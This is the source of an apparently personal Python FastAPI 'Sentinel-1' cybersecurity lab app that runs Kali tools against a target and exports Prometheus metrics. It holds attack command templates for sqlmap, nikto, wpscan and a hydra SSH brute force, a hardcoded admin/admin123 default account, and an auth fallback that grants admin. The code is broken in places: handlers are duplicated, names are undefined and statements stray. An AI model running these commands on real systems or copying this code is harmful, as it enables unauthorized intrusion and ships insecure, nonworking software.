            results['command'] = f"wpscan --url {target} --enumerate vp"
            
        else:
            results = {'success': True, 'output': f'Executed {tool} on {target}'}
        
        # Add success flag and metadata
        results['success'] = results.get('success', True)
        results['tool'] = tool
        results['target'] = target
        results['timestamp'] = datetime.utcnow().isoformat()
        
        # If this is a Metasploit exploit with session, add session info
        if tool == 'metasploit' and 'session' in results:
            results['session_opened'] = True
        
        # Broadcast exploit update via Socket.IO
        if sio:
            await sio.emit('exploit_update', {
                'type': 'EXPLOIT_STATUS',
                'data': {
                    'tool': tool,
                    'target': target,
                    'status': 'completed',
                    'success': results.get('success', True),
                    'session': results.get('session'),
                    'output': results.get('output', ''),
                    'credentials': results.get('credentials', [])
                }
            })
        
        return results
        
    except Exception as e:
        logger.error(f"Error in execute_attack: {e}")
        import traceback
        traceback.print_exc()
        return {'success': False, 'error': str(e), 'tool': tool if 'tool' in locals() else 'unknown'}
# Add endpoint to get attack suggestions
@app.get("/api/attack/suggestions")
async def get_attack_suggestions(target: str = None):
    """Get AI-generated attack suggestions for a target"""
    if not target:
        return {"suggestions": []}
    
    # Generate suggestions based on target
    suggestions = [
        {
            "vulnerability": "SQL Injection",
            "severity": "CRITICAL",
            "confidence": 0.89,
            "tool": "sqlmap",
            "command": f"sqlmap -u {target}/products.php?id=1 --batch --dbs",
            "description": "Test for SQL injection vulnerabilities in parameters"
        },
        {
            "vulnerability": "Cross-Site Scripting (XSS)",
            "severity": "HIGH",
            "confidence": 0.76,
            "tool": "nikto",
            "command": f"nikto -h {target} -C all",
            "description": "Scan for XSS and other web vulnerabilities"
        },
        {
            "vulnerability": "Weak SSH Credentials",
            "severity": "MEDIUM",
            "confidence": 0.82,
            "tool": "hydra",
            "command": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
            "description": "Brute force SSH login with common passwords"
        }
    ]
    
    return {"suggestions": suggestions, "target": target}



# @app.post("/api/agent/interact")
# async def agent_interact(request: Request):
#     data = await request.json()
#     user_query = data.get("query")

#     # Trigger the Orchestrator's executive loop
#     result = await orchestrator.executive_agent_loop(user_query)

#     # Broadcast 'Thought Stream' to WebSockets for the UI
#     await manager.send_personal_message({"type": "agent_thought", "data": result['thought']}, user_id)

   # return result
# Check this section in fast6.py
# In your agent_interact function (around line 8714 in fast6.py), update it to:
# Add this import at the top of your fast6.py file with the other FastAPI imports
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, Form, File, UploadFile, Body

@app.post("/api/agent/interact")
async def agent_interact(
    request: Request,
    query: str = Body(..., embed=True),
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)  # Get the current user
):
    """
    Interact with the AI agent
    """
    try:
        # Get user_id from authenticated user
        user_id = current_user.id if current_user else None
        
        # Process through orchestrator
        result = await orchestrator.executive_agent_loop(query)
        
        # Broadcast to WebSocket if manager exists and we have a user_id
        if 'manager' in locals() and user_id:
            try:
                await manager.send_personal_message(
                    {"type": "agent_thought", "data": result.get('thought', '')}, 
                    user_id
                )
            except Exception as e:
                logger.error(f"WebSocket broadcast failed: {e}")
        
        return result
    except Exception as e:
        logger.error(f"Agent interaction failed: {e}")
        return {"status": "error", "message": str(e)}


@app.on_event("startup")
async def unified_startup():
    # Combine all startup logic here
    global intelligence_engine, rag_system, correlation_system, orchestrator, emily_ai
    
    # Initialize database
    Base.metadata.create_all(bind=engine)
    
    # Initialize admin user
    db = SessionLocal()
    try:
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            admin_user = User(
                username="admin",
                email="admin@cybersec.local",
                password=get_password_hash("admin123"),
                role="admin",
                is_active=True
            )
            db.add(admin_user)
            db.commit()
    finally:
        db.close()
    
    # Initialize AI components
    rag_system = GPURAGSystem()
    rag_system.initialize(db)
    
    intelligence_engine = AISingleton.get_intelligence_engine()
    
    # Set metrics
    SENTINEL_INFO.labels(version='6.5').set(1)
    
    # Start GPU monitor
    asyncio.create_task(gpu_monitor())
    
    logger.info("Sentinel-1 startup complete")







# fast6.py - Complete Wireshark analysis function with detailed output
# fast6.py - CyberSec Lab Application v6.5
# Integrated with Prometheus, Grafana, and Sentinel-Brain

import os
import sys
import time
import asyncio
import logging
from datetime import datetime
from typing import Dict, Optional
from contextlib import asynccontextmanager
from fastapi import Request
from fastapi import FastAPI, Depends, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from prometheus_fastapi_instrumentator import Instrumentator

from prometheus_client.core import GaugeMetricFamily, CounterMetricFamily, REGISTRY
from prometheus_client import Counter, Gauge, Histogram, REGISTRY
# FORCE CLEAR REGISTRY ON STARTUP
for collector in list(REGISTRY._collector_to_names.keys()):
    REGISTRY.unregister(collector)
def get_or_create_metric(metric_type, name, documentation, labelnames=()):
    """Check if metric exists in registry before creating it."""
    if name in REGISTRY._names_to_collectors:
        # Return the existing metric if it's already registered
        return REGISTRY._names_to_collectors[name]
    return metric_type(name, documentation, labelnames)
def get_safe_gauge(name, description, labelnames=()):
    # Check if the metric is already in the global registry
    if name in REGISTRY._names_to_collectors:
        return REGISTRY._names_to_collectors[name]
    return Gauge(name, description, labelnames)
# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Check CUDA availability
try:
    import torch
    CUDA_AVAILABLE = torch.cuda.is_available()
except ImportError:
    CUDA_AVAILABLE = False
    logger.warning("PyTorch not available, GPU metrics disabled")

# Templates for dashboard
templates = Jinja2Templates(directory="templates")

# ==================== PROMETHEUS METRICS DEFINITION ====================
SENTINEL_BUILD = get_or_create_metric(Gauge, 'sentinel_build_info', 'Build details', ['version'])
LAYER_STATUS = get_or_create_metric(Gauge, 'layer_status', 'Status of neural layers', ['layer'])
# System Metrics
#SENTINEL_INFO = Gauge('sentinel_info', 'Sentinel-1 version info', ['version'])
SENTINEL_UPTIME = Gauge('sentinel_uptime_seconds', 'System uptime in seconds')
SENTINEL_START_TIME = time.time()

# GPU Metrics
GPU_VRAM_TOTAL = Gauge('gpu_vram_total_bytes', 'Total GPU VRAM in bytes')
GPU_VRAM_USED = Gauge('gpu_vram_used_bytes', 'Used GPU VRAM in bytes')
GPU_VRAM_FREE = Gauge('gpu_vram_free_bytes', 'Free GPU VRAM in bytes')
GPU_TEMPERATURE = Gauge('gpu_temperature_celsius', 'GPU temperature in Celsius')
GPU_UTILIZATION = Gauge('gpu_utilization_percent', 'GPU utilization percentage')

# Attack Metrics
ATTACK_TOTAL = get_or_create_metric(Counter, "sentinel_attacks_total", "Total attacks executed", ["tool", "status"])
#ATTACK_TOTAL = Counter("sentinel_attacks_total", "Total attacks executed", ["tool", "status"])
ATTACK_CRITICAL_TOTAL = Counter('attack_critical_total', 'Total critical attacks detected', ['type'])
ATTACK_CREDENTIALS_STOLEN = Counter('attack_credentials_stolen_total', 'Total credentials compromised')
ATTACK_SUCCESS_RATE = Gauge('attack_success_rate_percent', 'Attack success rate percentage', ['tool'])


# Other Metrics
SENTINEL_INFO = get_or_create_metric(Gauge, 'sentinel_info', 'Sentinel-1 version info', ['version'])
ACTIVE_SCANS = get_or_create_metric(Gauge, 'active_scans', 'Number of currently running scans')
# Layer Metrics
LAYER_PROCESSING_TIME = safe_metric(Histogram, 'layer_processing_time_seconds', 'Processing time per neural layer', ['layer']),
buckets=(0.001, 0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10)


# CNN Layer Metrics
CNN_ANOMALY_SCORE = Gauge('cnn_anomaly_score', 'CNN anomaly detection score', ['target'])
CNN_LATENT_DIM = Gauge('cnn_latent_dimension', 'CNN latent vector dimension')

# GNN Layer Metrics
GNN_NODES_TOTAL = Gauge('gnn_nodes_total', 'Total nodes in attack graph')
GNN_EDGES_TOTAL = Gauge('gnn_edges_total', 'Total edges in attack graph')
GNN_PATH_SCORE = Gauge('gnn_path_score', 'GNN path score', ['path_id'])

# MiniLM RAG Metrics
MINILM_RAG_LATENCY = Histogram(
    'minilm_rag_latency_ms',
    'MiniLM RAG retrieval latency in milliseconds',
    buckets=(5, 10, 25, 50, 100, 250, 500, 1000, 2500, 5000)
)
MINILM_SIMILAR_INCIDENTS = Gauge('minilm_similar_incidents', 'Number of similar incidents found', ['event_type'])

# Bayesian Metrics
BAYESIAN_CONFIDENCE = Gauge('bayesian_confidence', 'Bayesian confidence score', ['asset'])
BAYESIAN_UNCERTAINTY = Gauge('bayesian_uncertainty', 'Bayesian uncertainty level', ['asset'])
BAYESIAN_POSTERIOR = Gauge('bayesian_posterior', 'Bayesian posterior probability', ['event_type'])

# DeepSeek Metrics
DEEPSEEK_REASONING_TIME = Histogram(
    'deepseek_reasoning_ms',
    'DeepSeek reasoning time in milliseconds',
    buckets=(50, 100, 250, 500, 1000, 2500, 5000, 10000, 30000)
)
DEEPSEEK_TOKENS_INPUT = Counter('deepseek_tokens_input_total', 'Total input tokens processed')
DEEPSEEK_TOKENS_OUTPUT = Counter('deepseek_tokens_output_total', 'Total output tokens generated')
DEEPSEEK_CONFIDENCE = Gauge('deepseek_confidence', 'DeepSeek response confidence', ['analysis_id'])
BRAIN_LATENCY = Gauge("sentinel_brain_latency_seconds", "Sentinel Brain reasoning time")

# Replay Buffer Metrics
REPLAY_BUFFER_SIZE = Gauge('replay_buffer_size', 'Current replay buffer size')
REPLAY_BUFFER_HARD_SAMPLES = Gauge('replay_buffer_hard_samples', 'Number of hard samples in buffer')
REPLAY_BUFFER_NORMAL_SAMPLES = Gauge('replay_buffer_normal_samples', 'Number of normal samples in buffer')
MODEL_SUCCESS_RATE = Gauge('model_success_rate', 'Model success rate percentage')
MODEL_RETRAIN_COUNT = Counter('model_retrain_total', 'Total number of model retraining events')

# Event & Risk Metrics
EVENT_BUS_EVENTS = Counter('event_bus_events_total', 'Total events processed', ['event_type', 'severity'])
RISK_OVERALL_SCORE = Gauge('risk_overall_score', 'Overall risk score (0-10)')
RISK_ASSET_SCORE = Gauge('risk_asset_score', 'Risk score per asset', ['asset'])
RISK_LEVEL = Gauge('risk_level', 'Risk level numeric mapping', ['level'])

# System Health
ACTIVE_CONNECTIONS = Gauge('active_websocket_connections', 'Number of active WebSocket connections')
DATABASE_QUERY_TIME = Histogram('database_query_seconds', 'Database query time in seconds')
CACHE_HIT_RATIO = Gauge('cache_hit_ratio', 'Cache hit ratio percentage')


# ==================== PROMETHEUS INSTRUMENTATION ====================

# Initialize instrumentator with proper configuration
instrumentator = Instrumentator(
    should_group_status_codes=True,
    should_ignore_untemplated=True,
    should_respect_env_var=True,
    excluded_handlers=["/metrics"],
)
instrumentator.instrument(app)
# Instrument the app
instrumentator.instrument(app).expose(app, endpoint="/metrics", include_in_schema=False)
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles

# Make sure these point to your actual folders!
templates = Jinja2Templates(directory="templates") 
app.mount("/static", StaticFiles(directory="static"), name="static")
# ==================== GLOBAL REFERENCES ====================
# These will be set during startup
correlation_system = None
# orchestrator = None
intelligence_engine = None
rag_system = None
emily_ai = None
sentinel_brain = None
manager = None  # WebSocket manager

# ==================== CUSTOM COLLECTOR ====================
from prometheus_client.core import GaugeMetricFamily

class SentinelMetricsCollector:
    """Custom collector for Sentinel-specific metrics"""

    def __init__(
        self,
        correlation_system=None,
        orchestrator=None,
        sentinel_brain=None,
        rag_system=None,
        intelligence_engine=None,
        emily_ai=None,
    ):
        self.correlation_system = correlation_system
        self.orchestrator = orchestrator
        self.sentinel_brain = sentinel_brain
        self.rag_system = rag_system
        self.intelligence_engine = intelligence_engine
        self.emily_ai = emily_ai

    def collect(self):

        gpu_available = str(CUDA_AVAILABLE).lower()

        build_info = GaugeMetricFamily(
            'sentinel_build_info',
            'Build information',
            labels=['version', 'gpu_available']
        )
        build_info.add_metric(['6.5', gpu_available], 1)
        yield build_info

        layer_status = GaugeMetricFamily(
            'layer_status',
            'Status of each neural layer',
            labels=['layer', 'status']
        )

        layers = [
            ('cnn', 'active' if getattr(self, "sentinel_brain", None) else 'inactive'),
            ('gnn', 'active' if getattr(self, "sentinel_brain", None) else 'inactive'),
            ('minilm', 'active' if getattr(self, "rag_system", None) else 'inactive'),
            ('bayesian', 'active' if getattr(self, "correlation_system", None) else 'inactive'),
            ('deepseek', 'active' if getattr(self, "intelligence_engine", None) else 'inactive'),
            ('emily', 'active' if getattr(self, "emily_ai", None) else 'inactive'),
        ]

        for layer, status in layers:
            layer_status.add_metric(
                [layer, status],
                1 if status == 'active' else 0
            )

        yield layer_status
from prometheus_client import Counter, Gauge, Histogram, REGISTRY
collector = SentinelMetricsCollector(
    correlation_system=correlation_system,
    orchestrator=orchestrator,
    sentinel_brain=sentinel_brain,
    rag_system=rag_system,
    intelligence_engine=intelligence_engine,
    emily_ai=emily_ai,
)
try:
    REGISTRY.unregister(collector)
except KeyError:
    pass


# class SentinelMetricsCollector:
#     """Custom collector for Sentinel-specific metrics"""
    
#     def __init__(self,
#         correlation_system=None,
#         orchestrator=None,
#         sentinel_brain=None,
#         rag_system=None,
#         intelligence_engine=None,
#         emily_ai=None,
#     ):
#         self.correlation_system = correlation_system
#         self.orchestrator = orchestrator
#         self.sentinel_brain = sentinel_brain
#         self.rag_system = rag_system
#         self.intelligence_engine = intelligence_engine
#         self.emily_ai = emily_ai
    
#     def collect(self):
#         # System info
#         gpu_available = str(CUDA_AVAILABLE).lower()
#         build_info = GaugeMetricFamily('sentinel_build_info', 'Build information', 
#                                        labels=['version', 'gpu_available'])
#         build_info.add_metric(['6.5', gpu_available], 1)
#         yield build_info
        
#         # Layer status
#         layer_status = GaugeMetricFamily('layer_status', 'Status of each neural layer',
#                                          labels=['layer', 'status'])
        
#         # Define layer statuses
#         layers = [
#             ('cnn', 'active' if self.sentinel_brain else 'inactive'),
#             ('gnn', 'active' if self.sentinel_brain else 'inactive'),
#             ('minilm', 'active' if self.rag_system else 'inactive'),
#             # ('bayesian', 'active' if correlation_system else 'inactive'),
#             ('bayesian', 'active' if self.correlation_system else 'inactive'),
#             ('deepseek', 'active' if self.intelligence_engine else 'inactive'),
#             ('emily', 'active' if self.emily_ai else 'inactive')
#         ]
        
#         for layer, status in layers:
#             layer_status.add_metric([layer, status], 1 if status == 'active' else 0)
        
#         yield layer_status

# ==================== MIDDLEWARE ====================

@app.middleware("http")
async def metrics_middleware(request: Request, call_next):
    """Middleware to collect request metrics"""
    start_time = time.time()
    
    # Process request
    response = await call_next(request)
    
    # Record duration
    duration = time.time() - start_time
    
    # Update metrics based on endpoint
    path = request.url.path
    if '/api/layer1' in path:
        LAYER_PROCESSING_TIME.labels(layer='cnn').observe(duration)
    elif '/api/layer2' in path:
        LAYER_PROCESSING_TIME.labels(layer='gnn').observe(duration)
    elif '/api/layer3' in path:
        LAYER_PROCESSING_TIME.labels(layer='minilm').observe(duration)
    elif '/api/layer4' in path:
        LAYER_PROCESSING_TIME.labels(layer='bayesian').observe(duration)
    elif '/api/layer5' in path:
        LAYER_PROCESSING_TIME.labels(layer='deepseek').observe(duration)
    
    return response

# ==================== METRICS ENDPOINT ====================

@app.get("/metrics")
async def get_metrics():
    """Prometheus metrics endpoint"""
    # Update uptime
    SENTINEL_UPTIME.set(time.time() - SENTINEL_START_TIME)
    
    # Update GPU metrics if available
    if CUDA_AVAILABLE:
        try:
            GPU_VRAM_TOTAL.set(torch.cuda.get_device_properties(0).total_memory)
            GPU_VRAM_USED.set(torch.cuda.memory_allocated(0))
            GPU_VRAM_FREE.set(torch.cuda.memory_reserved(0) - torch.cuda.memory_allocated(0))
            
            # Try to get temperature
            try:
                import subprocess
                result = subprocess.run(
                    ['nvidia-smi', '--query-gpu=temperature.gpu', '--format=csv,noheader'],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0 and result.stdout.strip():
                    temp = float(result.stdout.strip())
                    GPU_TEMPERATURE.set(temp)
            except:
                pass
            
            # Update utilization
            try:
                result = subprocess.run(
                    ['nvidia-smi', '--query-gpu=utilization.gpu', '--format=csv,noheader'],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0 and result.stdout.strip():
                    util = float(result.stdout.strip().replace('%', ''))
                    GPU_UTILIZATION.set(util)
            except:
                pass
        except Exception as e:
            logger.error(f"GPU metrics error: {e}")
    
    return Response(content=generate_latest(), media_type=CONTENT_TYPE_LATEST)

# ==================== API ROUTES ====================
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/api/attack/execute")
async def execute_attack(tool: str, target: str):
    """Execute an attack and record metrics"""
    start_time = asyncio.get_event_loop().time()
    try:
        # Business logic for attack execution
        # This is where your actual attack code would go
        
        ATTACK_TOTAL.labels(tool=tool, status="success").inc()
        ATTACK_SUCCESS_RATE.labels(tool=tool).set(100)
        
        return {"status": "success", "target": target}
    except Exception as e:
        ATTACK_TOTAL.labels(tool=tool, status="error").inc()
        ATTACK_SUCCESS_RATE.labels(tool=tool).set(0)
        return {"status": "error", "message": str(e)}
    finally:
        BRAIN_LATENCY.set(asyncio.get_event_loop().time() - start_time)

# @app.get("/api/metrics/summary")
# async def get_metrics_summary():
#     """Get metrics summary with robust Prometheus value extraction"""
    
#     def get_val(metric):
#     #     try:
    #         # The most reliable way: collect the metric samples
    #         samples = list(metric.collect())
    #         if samples and samples[0].samples:
    #             return samples[0].samples[0].value
    #         return 0
    #     except Exception:
    #         # Fallback to your getattr logic if collection fails
    #         return getattr(metric, '_value', type('obj', (object,), {'value': 0})).value

    # summary = {
    #     'system': {
    #         'uptime': time.time() - SENTINEL_START_TIME,
    #         'gpu_available': CUDA_AVAILABLE
    #     },
    #     'metrics': {
    #         'attack_total': get_val(ATTACK_TOTAL),
    #         'active_connections': get_val(ACTIVE_CONNECTIONS)
    #     }
    # }
    # return summary

@app.get("/metrics/dashboard", response_class=HTMLResponse)
async def metrics_dashboard(request: Request):
    """Simple metrics dashboard"""
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sentinel-1 Metrics</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #f0f2f5; }
            .container { max-width: 800px; margin: auto; }
            .card { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            h1 { color: #1a73e8; }
            .metric { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #eee; }
            .metric-name { font-weight: bold; }
            .metric-value { color: #1a73e8; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Sentinel-1 Metrics Dashboard</h1>
            <div class="card">
                <h2>System Information</h2>
                <div class="metric">
                    <span class="metric-name">Version:</span>
                    <span class="metric-value">6.5</span>
                </div>
                <div class="metric">
                    <span class="metric-name">GPU Available:</span>
                    <span class="metric-value">""" + str(CUDA_AVAILABLE) + """</span>
                </div>
                <div class="metric">
                    <span class="metric-name">Uptime:</span>
                    <span class="metric-value" id="uptime">Calculating...</span>
                </div>
            </div>
            <div class="card">
                <h2>Prometheus & Grafana</h2>
                <div class="metric">
                    <span class="metric-name">Prometheus Metrics:</span>
                    <span class="metric-value"><a href="/metrics">/metrics</a></span>
                </div>
                <div class="metric">
                    <span class="metric-name">Prometheus UI:</span>
                    <span class="metric-value"><a href="http://localhost:9090" target="_blank">http://localhost:9090</a></span>
                </div>
                <div class="metric">
                    <span class="metric-name">Grafana:</span>
                    <span class="metric-value"><a href="http://localhost:3000" target="_blank">http://localhost:3000</a></span>
                </div>
            </div>
        </div>
        <script>
            function updateUptime() {
                fetch('/api/metrics/summary')
                    .then(response => response.json())
                    .then(data => {
                        const uptime = Math.floor(data.system.uptime);
                        const hours = Math.floor(uptime / 3600);
                        const minutes = Math.floor((uptime % 3600) / 60);
                        const seconds = uptime % 60;
                        document.getElementById('uptime').textContent = 
                            hours + 'h ' + minutes + 'm ' + seconds + 's';
                    });
            }
            updateUptime();
            setInterval(updateUptime, 1000);
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)
@app.get("/metrics/dashboard", response_class=HTMLResponse)
# ==================== STARTUP EVENT ====================

@app.on_event("startup")



async def startup_event():
    """Initialize on startup"""
    global correlation_system, orchestrator, intelligence_engine
    global rag_system, emily_ai, sentinel_brain, manager
    
    print("\n" + "=" * 60)
    print(" 🚀 Starting SENTINEL-1 Intelligence Engine v6.5".center(60))
    print("=" * 60 + "\n")
    
    # Set initial metrics
    SENTINEL_INFO.labels(version='6.5').set(1)
    SENTINEL_UPTIME.set(0)
    
    # Initialize custom collector
    collector = SentinelMetricsCollector(
    correlation_system=correlation_system,
    orchestrator=orchestrator,
    sentinel_brain=sentinel_brain,
    rag_system=rag_system,
    intelligence_engine=intelligence_engine,
    emily_ai=emily_ai,
)
    REGISTRY.register(collector)
    
    # Expose metrics endpoint
    # instrumentator.expose(app, endpoint="/metrics", include_in_schema=False)
    
    print("✅ Prometheus metrics initialized at /metrics")
    print("📊 Grafana available at http://localhost:3000")
    print("📈 Prometheus available at http://localhost:9090\n")
    
    logger.info("Sentinel-1 startup complete")

from prometheus_client import Counter, Gauge, Histogram, REGISTRY

REQUEST_LATENCY = Histogram(
    "sentinel_request_latency_seconds",
    "Request latency in seconds",
    ["method", "endpoint"],
    buckets=(0.01, 0.05, 0.1, 0.3, 0.5, 1, 2, 5)
)
import time
from starlette.middleware.base import BaseHTTPMiddleware

class MetricsMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        start_time = time.time()
        response = await call_next(request)
        duration = time.time() - start_time

        REQUEST_LATENCY.labels(
            method=request.method,
            endpoint=request.url.path
        ).observe(duration)

        return response

app.add_middleware(MetricsMiddleware)

from prometheus_client import Counter, Gauge, Histogram, REGISTRY

ATTACK_COUNTER = Counter(
    "sentinel_attack_total",
    "Total number of attacks executed",
    ["attack_type", "status"]
)
ATTACK_COUNTER.labels(
    attack_type="hydra",
    status="success"#cmd wsl use it- sum(rate(sentinel_attack_total[5m]))
).inc()
MODEL_INFERENCE_TIME = Histogram(
    "sentinel_model_inference_seconds",
    "Time taken for model inference",
    ["model"],
    buckets=(0.01, 0.05, 0.1, 0.2, 0.5, 1, 2, 5)
)
import time

start = time.time()
# result = intelligence_engine.run(data)
duration = time.time() - start#wsl cmd use it -histogram_quantile(0.95, sum(rate(sentinel_model_inference_seconds_bucket[5m])) by (le))

MODEL_INFERENCE_TIME.labels(model="deepseek").observe(duration)

from prometheus_client import Counter, Gauge, Histogram, REGISTRY
import torch

GPU_MEMORY_USED = Gauge(
    "sentinel_gpu_memory_bytes",
    "GPU memory currently allocated"
)
import asyncio

async def gpu_monitor():
    while True:
        if torch.cuda.is_available():
            mem = torch.cuda.memory_allocated()
            GPU_MEMORY_USED.set(mem)
        await asyncio.sleep(5)


@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    logger.info("Shutting down Sentinel-1...")
@app.on_event("startup")
async def startup_event():
    """Unified Startup: Fixed and Corrected"""
    global intelligence_engine, collector
    
    print("\n" + "=" * 60)
    print(" 🚀 SENTINEL-1 Intelligence Engine v6.5 Initializing".center(60))
    print("=" * 60)
    
    # 1. Initialize Database
    print("🚀 Initializing database...")
    try:
        Base.metadata.create_all(bind=engine)
        print("✅ Tables ensured.")
    except Exception as e:
        print(f"❌ DB Error: {e}")

    # 2. Initialize AI Modules
    print("✓ Initializing Intelligence Engine Modules...")
    intelligence_engine = IntelligenceEngine()
    
    # 3. Register Prometheus Collector safely
    try:
        from prometheus_client import Counter, Gauge, Histogram, REGISTRY
        # Define a unique name for your collector to avoid registration conflicts
        collector = SentinelMetricsCollector(
            intelligence_engine=intelligence_engine
            # Add other systems here if initialized
        )
        
        # Check if already registered to prevent "already registered" errors
        try:
            REGISTRY.register(collector)
            print("📊 Custom Sentinel Collector registered.")
        except ValueError:
            print("ℹ️ Collector already registered, skipping.")
    except Exception as e:
        print(f"⚠️ Metrics Error: {e}")

    # 4. THE FIX: Background Tasks
    # Corrected from create_all() to create_task()
    asyncio.create_task(gpu_monitor()) 
    
    print("✅ Startup complete. GPU Monitor active.")
    print("=" * 60 + "\n")

 #   result = intelligence_engine.run(test_data)  # safe now
    try:
        REGISTRY.register(collector)
        print("📊 Custom Sentinel Collector registered.")
    except Exception as e:
        print(f"⚠️ Collector registration: {e}")
# ==================== METRICS HELPER FUNCTIONS ====================

def record_layer_metrics(layer_name: str, start_time: float, metadata: Dict = None):
    """Record layer processing metrics - to be called from orchestrator"""
    duration = (datetime.utcnow() - start_time).total_seconds()
    
    # Record processing time
    LAYER_PROCESSING_TIME.labels(layer=layer_name).observe(duration)
    
    if not metadata:
        return
    
    # Layer-specific metrics
    if layer_name == 'cnn':
        CNN_ANOMALY_SCORE.labels(target=metadata.get('target', 'unknown')).set(
            metadata.get('anomaly_score', 0.5)
        )
        CNN_LATENT_DIM.set(metadata.get('latent_dim', 256))
    
    elif layer_name == 'gnn':
        GNN_NODES_TOTAL.set(metadata.get('nodes', 0))
        GNN_EDGES_TOTAL.set(metadata.get('edges', 0))
        
        for i, path in enumerate(metadata.get('paths', [])[:5]):
            GNN_PATH_SCORE.labels(path_id=f"path_{i}").set(path.get('score', 0.5))
    
    elif layer_name == 'minilm':
        MINILM_RAG_LATENCY.observe(duration * 1000)  # Convert to ms
        MINILM_SIMILAR_INCIDENTS.labels(
            event_type=metadata.get('event_type', 'unknown')
        ).set(metadata.get('similar_count', 0))
    
    elif layer_name == 'bayesian':
        BAYESIAN_CONFIDENCE.labels(asset=metadata.get('asset', 'unknown')).set(
            metadata.get('confidence', 0.5)
        )
        BAYESIAN_UNCERTAINTY.labels(asset=metadata.get('asset', 'unknown')).set(
            metadata.get('uncertainty', 0.5)
        )
        BAYESIAN_POSTERIOR.labels(event_type=metadata.get('event_type', 'unknown')).set(
            metadata.get('posterior', 0.5)
        )
    
    elif layer_name == 'deepseek':
        DEEPSEEK_REASONING_TIME.observe(duration * 1000)
        DEEPSEEK_CONFIDENCE.labels(analysis_id=metadata.get('analysis_id', 'unknown')).set(
            metadata.get('confidence', 0.5)
        )
        DEEPSEEK_TOKENS_INPUT.inc(metadata.get('tokens_input', 0))
        DEEPSEEK_TOKENS_OUTPUT.inc(metadata.get('tokens_output', 0))

def record_attack_metrics(tool: str, success: bool, critical: bool = False):
    """Record attack-related metrics"""
    if success:
        ATTACK_SUCCESS_RATE.labels(tool=tool).set(100)
    else:
        ATTACK_SUCCESS_RATE.labels(tool=tool).set(0)
    
    if critical:
        ATTACK_CRITICAL_TOTAL.labels(type=tool).inc()

def record_credentials_stolen(count: int = 1):
    """Record credential compromise metrics"""
    ATTACK_CREDENTIALS_STOLEN.inc(count)

def record_event_bus_metrics(event_type: str, severity: str):
    """Record event bus metrics"""
    EVENT_BUS_EVENTS.labels(event_type=event_type, severity=severity).inc()

def record_database_query(duration: float):
    """Record database query time"""
    DATABASE_QUERY_TIME.observe(duration)

@app.get("/dashboard", response_class=HTMLResponse, include_in_schema=False)
async def dashboard_page(request: Request, db: Session = Depends(get_db)):
    """Dashboard page - requires authentication"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except Exception as e:
        print(f"Auth error: {e}")
        return RedirectResponse(url="/login")
    
    # Get stats for dashboard
    try:
        recent_scans = db.query(ScanHistory).filter(
            ScanHistory.user_id == user.id
        ).order_by(ScanHistory.timestamp.desc()).limit(5).all()
    except:
        recent_scans = []
    
    try:
        recent_attacks = db.query(AttackHistory).filter(
            AttackHistory.user_id == user.id
        ).order_by(AttackHistory.timestamp.desc()).limit(5).all()
    except:
        recent_attacks = []
    
    try:
        scans_count = db.query(ScanHistory).filter(
            ScanHistory.user_id == user.id
        ).count()
    except:
        scans_count = 0
    
    try:
        attacks_count = db.query(AttackHistory).filter(
            AttackHistory.user_id == user.id
        ).count()
    except:
        attacks_count = 0
    
    try:
        tools = db.query(KaliTools).limit(12).all()
    except:
        tools = []
    
    # Check Kali VM status
    kali_status = False
    try:
        kali_status = kali_vm.check_vm_status()
    except:
        pass
    
    return templates.TemplateResponse("dashboard.html", {
        "request": request,
        "user": user,
        "recent_scans": recent_scans,
        "recent_attacks": recent_attacks,
        "scans": recent_scans,
        "attacks": recent_attacks,
        "scans_count": scans_count,
        "attacks_count": attacks_count,
        "tools": tools,
        "kali_status": kali_status,
        "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
        "gpu_available": CUDA_AVAILABLE,
        "ai_enabled": True
    })
# @app.post("/login", include_in_schema=False)
# async def login(
#     request: Request, 
#     username: str = Form(...), 
#     password: str = Form(...)
# ):
#     # SIMPLE AUTH CHECK (Replace with your DB logic)
#     if username == "admin" and password == "admin123":
#         response = RedirectResponse(url="/dashboard", status_code=303)
#         # Set a dummy cookie for your @app.get("/math") checks
#         response.set_cookie(key="access_token", value="fake-token")
#         return response
    
#     # If login fails, send back to login with an error
#     return templates.TemplateResponse("login.html", {
#         "request": request, 
#         "error": "Invalid username or password"
#     })
    


# def get_or_create_gauge(name, documentation, labelnames=()):
#     """Specific helper for Gauges."""
#     if name in REGISTRY._names_to_collectors:
#         return REGISTRY._names_to_collectors[name]
#     return Gauge(name, documentation, labelnames)

# # Around line 10579
# SENTINEL_INFO = get_or_create_metric(Gauge, 'sentinel_info', 'Sentinel-1 version info', ['version'])
# ACTIVE_SCANS = get_or_create_metric(Gauge, 'active_scans', 'Number of currently running scans')
